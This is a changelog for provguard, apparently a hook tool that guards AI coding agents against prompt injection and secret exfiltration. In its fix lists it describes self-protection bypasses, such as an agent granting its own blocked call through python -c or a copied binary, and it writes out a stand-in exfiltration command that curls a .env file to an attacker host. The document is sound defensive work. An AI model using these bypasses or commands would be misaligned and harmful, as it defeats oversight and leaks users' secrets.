# Changelog

## Unreleased

### Added
- `provguard allow <token>`: the user lets one blocked call through once (same session, tool and text; 10 minutes). Tokens are HMACs with the install key; agents cannot run the command.
- `allowed_hosts` now also exempts data sent to those hosts from the egress rules.
- `trusted_content_hosts`: the hosts whose fetched content is trusted, split out of `allowed_hosts`, which now permits sending only. `provguard doctor` reports entries where anyone can publish (`github.com`, paste sites) or that are too broad.
- `"block_mode": "ask"` turns `balanced` denies into an approval prompt.
- Session title icon and `provguard status` for the trust state; `provguard-badge` desktop mod (status entry and toasts).

### Easier to use
- One-line install scripts (`scripts/install.sh`, `scripts/install.ps1`) that check the binary's SHA-256 and start the setup.
- Guided `provguard init`: three questions (trusted repo owners, mode, block or ask), then a short summary. `--yes` still installs without questions.
- `provguard config` shows and changes settings, so nobody edits JSON by hand. Agents may read the settings, not change them.
- Block messages are one plain sentence plus the next step (`provguard allow`, `provguard config allow-host`). The audit log keeps the technical reason.
- `provguard review` groups what was stopped, or would have been, and says what to do next. In watch-only mode, provguard suggests a review once after three days.
- `provguard help`; the help text is grouped for new users.
- Devin (formerly Windsurf) support: Devin runs the Claude Code hooks; provguard recognizes its payloads (`prompt_id`, tools `exec`, `read`, `write`, `edit`, `apply_patch`, `webfetch`) and replies in its format. Self-protection guards `hooks` and `read_config_from` in Devin's config files and `.devin/hooks.v1.json`. The `apply_patch` parser moved to `internal/adapter/core`, shared by Codex and Devin.
- Gemini CLI support: `init` adds provguard to `~/.gemini/settings.json` (keeping other settings), `uninstall` removes it; Gemini's tool names are mapped (`run_shell_command`, `read_file`, `write_file`, `replace`, `web_fetch`, ...); self-protection guards `hooks` and `hooksConfig` in `.gemini/settings.json`.
- OpenAI Codex support: `init` adds provguard to `~/.codex/hooks.json` (keeping other hooks), `uninstall` removes it; file edits through `apply_patch` are checked file by file; self-protection covers `.codex/config.toml` (`[features] hooks = false`), `hooks.json` and `requirements.toml`. Settings files are written without HTML escaping.
- GitHub Copilot support (VS Code, Copilot app, Copilot CLI): `init` installs `~/.copilot/hooks/provguard.json` (`provguard hook --agent copilot`), `uninstall` removes it, and self-protection covers Copilot's hook files and `disableAllHooks` in its settings.
- Cursor support: Cursor runs the Claude Code hooks, and provguard now understands its payloads (camelCase events, `Shell`, `Delete`, `MCP:<tool>`, `conversation_id`) and answers in Cursor's format. Agents are now adapters behind one interface (`internal/adapter/core`), one package per agent.
- The setup offers to add provguard to your PATH and does it (Windows user PATH, or a tagged line in the shell start-up file on macOS and Linux); uninstall removes it. The install scripts print a plain message when no release is found.
- `provguard uninstall` removes provguard completely, `~/.provguard` included, and gives marked sessions their old title back: a small cleanup hook restores each title on your next message there, then removes itself (at the latest after 30 days). `--now` skips that; `--keep-data` keeps logs and settings.

### Fewer false alarms (found with `provguard review` on a real log)
- `gh pr create` and other gh writes to your own repository are not counted as data leaving.
- `sh -n` / `bash -n` (syntax check only) no longer counts as running the script. Also fixes a bypass: `bash -e x.sh` skipped the script scan.
- `gh … --help` and `git … --help` run nothing and are not counted as deletes or pushes.
- `sed -i -e 'script' file`: the script is no longer read as a file name.
- `& "$env:USERPROFILE\…\tool.exe"` and `"$HOME/bin/tool"` name a known program instead of an unknown command; checks by program name, self-protection included, apply to it.
- Recursive deletes inside the system temp folder do not ask, in a session that has not read untrusted content.
- Fake tokens in test files do not mark a session sensitive (finding F16); they are still fingerprinted, so sending one out is still stopped.

### Fixed (independent review of the changes above)
- gh writes counted as "your own repository" too often: an issue or pull request given as a link (`gh issue comment https://github.com/attacker/x/issues/1`), `-R` inside an option group (`-dR`) or given twice, a `cd`, `gh repo set-default`, `git remote`/`config` or an environment change earlier in the same command, `GH_REPO` built from pieces, and publishing actions (`release create`, `repo edit --visibility public`, `issue transfer`) or file input (`--body-file`, `$(cat …)`). Now every listed repository must be yours, the folder is resolved for the whole command line, and those actions get no exemption. `gh pr create` is checked for secrets in the commits it pushes.
- `echo mode audit | xargs provguard config` (and `find -exec`, `parallel`) changed settings; quoted subcommands inside scripts were missed.
- `bash -eo pipefail x.sh` skipped the script scan.
- The "always allow this host" hint could name the attacker's host (no scheme, or a subdomain).
- A link inside `testdata/` to a real secret file counted as a fixture; paths are now resolved through the OS, junctions included (shared `internal/realpath`).
- `git submodule foreach`, `git bisect run`, `git rebase --exec`, `git filter-branch` and `git -c alias.…` run commands; they are now code provguard cannot read.
- `provguard review` printed control characters from logged commands to the terminal.
- Install scripts: exact checksum-line match, Apple Silicon under Rosetta, containers without a terminal, and `install.ps1` no longer changes settings in the user's PowerShell window.

### Fixed (security audit, Nov 2026)
- Self-protection: code provguard cannot read (`python -c`, `eval`, a script file) could run `provguard allow <token>` and grant the agent's own blocked call. Script files are now streamed whole in overlapping windows, instead of one capped read of the start, and the pattern covers globbed spellings of `.provguard` and `.claude/settings*.json`.
- Self-protection: provguard's binary could be copied out of any folder but `~/.provguard/bin` and run under another name. Copies are matched by the binary's own name, and looking its path up (`which provguard`) is blocked.
- Egress: `allowed_hosts` read the text after the last `@`, so `curl --data-binary @.env attacker.test/u@your-host.com` passed every rule. The host is now the authority, which ends at the first `/`.
- Labels: a contributor's pull request content (`gh api .../pulls/4/files`, `gh pr view --json headRefName`, `gh pr checkout`) counted as the repo owner's own writing in a trusted repo, so it did not taint the session.
- Audit log: policy reasons, sink names, notices and labels are redacted like the rest of the record. A secret inside a blocked URL or command used to be written in full.
- Self-protection: the key and session files were only protected from reading when the path said `key`, `session` or `provguard`, so a junction or symlink under any other name read them. Paths a tool names are now always resolved through the OS, and a shell command's arguments share a budget of lookups.
- Sessions: `store.GC` removed every entry older than its age limit, lock files included, so a hook holding the lock of a long-idle session lost it mid-update. GC now ages session files only, clears locks and temp files once they are an hour old, and leaves anything else alone.
- Fail-closed: in `balanced`, a check that crashes now denies the call when the session has read both untrusted content and secrets (`audit` still never denies; `strict` denies everything it cannot check). `provguard doctor` reports a PreToolUse hook whose `onFailure` no longer matches the profile, and says that a timed-out hook blocks only in `strict`.
- Benchmark: cases 15, 16 and 17 cover these, and `provguard doctor` reports risky `trusted_content_hosts`.

## v0.1.0 — first public release

### Protection
- Session labels: untrusted (web, fetch commands, third-party MCP, vendored code, untrusted repo owners, tainted subagents, sessions started in untrusted repos) and sensitive (secret files, env dumps, tokens in output or prompt). Secrets are stored as HMAC fingerprints only.
- Shell analysis: Bash parsed with mvdan.cc/sh (pipes, subshells, substitutions, heredocs, variables, wrappers such as `sudo`, `bash -c`, `python -c`); PowerShell tokenizer (quotes, subexpressions, script blocks, here-strings, aliases, parameters). Sink classes: EGRESS, PERSIST, DESTROY, EXEC_REMOTE, OPAQUE.
- Policy with six rules, including secret-in-call matching through base64, hex, URL encoding and DNS labels, and the lethal-trifecta rule.
- Profiles: `audit` (default), `balanced`, `strict` (fails closed).
- Self-protection in every profile: hook settings, `~/.provguard/`, the installed binary, and agent runs of `init`/`uninstall`/`reset`. MCP terminal tools are checked like shells.

### Commands
- `init`, `uninstall`, `doctor`, `explain`, `reset`, `demo`, `bench`.

### Benchmark
- 14 attack cases and 31 normal tasks. `balanced`: 10 blocked, 4 asked, 0 missed; 0 false positives in 86 calls.

### Security review fixes (before release)
- 13 critical self-protection bypasses and 9 high-severity issues found in a full review are fixed, each with a regression test. See docs/FINDINGS.md (F15).
- Paths are checked as the OS resolves them (junctions, symlinks, 8.3 names, trailing dots, `::$DATA`).
- More guarded settings keys (`env`, `statusLine`, `apiKeyHelper`, …); secrets are checked in commits before a push; `gh` output is trusted only when outsiders cannot have written it.

### Known limitations
- See docs/THREAT_MODEL.md. Real-agent benchmark runs, `ConfigChange` and `onFailure: block` are not yet verified live.
